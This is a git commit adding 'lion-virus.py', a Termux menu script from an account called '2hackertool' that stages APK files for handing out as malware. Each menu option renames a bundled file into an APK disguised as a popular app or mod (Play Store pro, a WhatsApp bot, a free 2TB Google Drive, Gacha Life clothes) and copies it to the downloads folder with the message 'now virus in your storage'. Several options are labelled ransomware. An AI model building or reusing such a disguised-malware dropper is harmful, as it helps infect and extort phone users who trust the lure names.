2f7f812a99fac673bb7b5d35bdb55c60d6124adf
2hackertool <160114976+2hackertool@users.noreply.github.com>
2024-04-04 19:37:03 +0300

    Add files via upload

---
+++ lion-virus.py
@@ -0,0 +1,138 @@
+#lion virus
+from pystyle import *
+import os
+import time
+import pyphisher
+time.sleep(2)
+os.system("clear")
+os.system("figlet Lion-Virus | lolcat")
+print()
+choice ='''
+         1 settings pro
+         2 play store pro
+         3 hack app data
+         4 hellboy
+         5 termux pro
+         6 hd wallpapers
+         7 text now pro
+         8 Auto bot for whatsapp
+         9 Dendroid
+         _____________________
+         
+         ransomware virus
+         10 google drive mod 2tb free
+         11 zepeto mod zems
+         12 Russian car crash simulator 
+         13 apk editor pro
+         14 apk easy tool for android 
+         15 gacha life 2 mod new clothes
+         16 dragon tales game'''
+print(Colors.yellow + choice)
+choose = input("choose : ")
+if choose == "1":
+  os.system("mv q. settings_pro.apk")
+  os.system("cp settings_pro.apk /data/data/com.termux/files/home/storage/downloads")
+  print(Colors.green + "now virus in your storage")
+  print(Colors.green + "now check downloads folder")
+  print(Colors.green + "note don't delete any file on this tool")
+elif choose == "2":
+    os.system("mv z. Play_store_pro.apk")
+    os.system("cp Play_store_pro.apk /data/data/com.termux/files/home/storage/downloads")
+    print(Colors.green + "now virus in your storage")
+    print(Colors.green + "now check downloads folder")
+    print(Colors.green + "note don't delete any file on this tool")
+elif choose == "3":
+    os.system("mv h. hack-app-data-1-9-12.apk")
+    os.system("cp hack-app-data-1-9-12.apk settings_pro.apk /data/data/com.termux/files/home/storage/downloads")
+    print(Colors.green + "now virus in your storage")
+    print(Colors.green + "now check downloads folder")
+    print(Colors.green + "note don't delete any file on this tool")
+elif choose == "4":
+    os.system("mv b. Hellboy.apk")
+    os.system("cp Hellboy.apk /data/data/com.termux/files/home/storage/downloads")
+    print(Colors.green + "now virus in your storage")
+    print(Colors.green + "now check downloads folder")
+    print(Colors.green + "note don't delete any file on this tool")
+elif choose == "5":
+    os.system("mv t. Termux_pro.apk")
+    os.system("cp Termux_pro.apk /data/data/com.termux/files/home/storage/downloads")
+    print(Colors.green + "now virus in your storage")
+    print(Colors.green + "now check downloads folder")
+    print(Colors.green + "note don't delete any file on this tool")
+elif choose == "6":
+    os.system("mv g. Nature_hd_walpapers.apk")
+    os.system("cp Nature_hd_walpapers.apk /data/data/com.termux/files/home/storage/downloads")
+    print(Colors.green + "now virus in your storage")
+    print(Colors.green + "now check downloads folder")
+    print(Colors.green + "note don't delete any file on this tool")
+elif choose == "7":
+    os.system("mv y. Text_now_pro.apk")
+    os.system("cp Text_now_pro.apk /data/data/com.termux/files/home/storage/downloads")
+    print(Colors.green + "now virus in your storage")
+    print(Colors.green + "now check downloads folder")
+    print(Colors.green + "note don't delete any file on this tool")
+elif choose == "8":
+    os.system("mv A. Auto_bot_for_whatsapp.apk")
+    os.system("cp Auto_bot_for_whatsapp.apk /data/data/com.termux/files/home/storage/downloads")
+    print(Colors.green + "now virus in your storage")
+    print(Colors.green + "now check downloads folder")
+    print(Colors.green + "note don't delete any file on this tool")
+elif choose == "9":
+    os.system("mv D. dendroid.apk")
+    os.system("cp dendroid.apk data/data/com.termux/files/home/storage/downloads")
+    print(Colors.green + "now virus in your storage")
+    print(Colors.green + "now check downloads folder")
+    print(Colors.green + "note don't delete any file on this tool")
+elif choose == "10":
+    os.system("mv r. drive.apk")
+    os.system("cp drive.apk /data/data/com.termux/files/home/storage/downloads")
+    os.system("mv drive.apk r.")
+    print(Colors.green + "now virus in your storage")
+    print(Colors.green + "now check downloads folder")
+    print(Colors.green + "note don't delete any file on this tool")
+elif choose == "11":
+    os.system("mv f. zepeto.apk")
+    os.system("cp zepeto.apk /data/data/com.termux/files/home/storage/downloads")
+    os.system("mv zepto.apk f.")
+    print(Colors.green + "now virus in your storage")
+    print(Colors.green + "now check downloads folder")
+    print(Colors.green + "note don't delete any file on this tool")
+elif choose == "12":
+    os.system("mv ru. russiancarcrach.apk")
+    os.system("cp russiancarcrach.apk /data/data/com.termux/files/home/storage/downloads")
+    os.system("mv russiancarcrach.apk ru.")
+    print(Colors.green + "now virus in your storage")
+    print(Colors.green + "now check downloads folder")
+    print(Colors.green + "note don't delete any file on this tool")
+elif choose == "13":
+    os.system("mv apk. apk-editer-pro.apk")
+    os.system("cp apk-editer-pro.apk /data/data/com.termux/files/home/storage/downloads")
+    os.system("mv apk-editer-pro.apk apk.")
+    print(Colors.green + "now virus in your storage")
+    print(Colors.green + "now check downloads folder")
+    print(Colors.green + "note don't delete any file on this tool")
+elif choose == "14":
+    os.system("mv es. apk-easy-tool.apk")
+    os.system("cp apk-easy-tool.apk /data/data/com.termux/files/home/storage/downloads")
+    os.system("mv apk-easy-tool.apk es.")
+    print(Colors.green + "now virus in your storage")
+    print(Colors.green + "now check downloads folder")
+    print(Colors.green + "note don't delete any file on this tool")
+elif choose == "15":
+    os.system("mv gh. gachalifemodnewclothes.apk")
+    os.system("cp gachalifemodnewclothes.apk /data/data/com.termux/files/home/storage/downloads")
+    os.system("mv gachalifemodnewclothes.apk gh.")
+    print(Colors.green + "now virus in your storage")
+    print(Colors.green + "now check downloads folder")
+    print(Colors.green + "note don't delete any file on this tool")
+elif choose == "16":
+    os.system("mv dr. dragon-tales.apk")
+    os.system("cp dragon-tales.apk /data/data/com.termux/files/home/storage/downloads")
+    os.system("mv dragon-tales.apk dr.")
+    print(Colors.green + "now virus in your storage")
+    print(Colors.green + "now check downloads folder")
+    print(Colors.green + "note don't delete any file on this tool")
+else:
+   print(Colors.red + "error try again")
+   time.sleep(2)
+   os.system("python3 lion-virus.py")
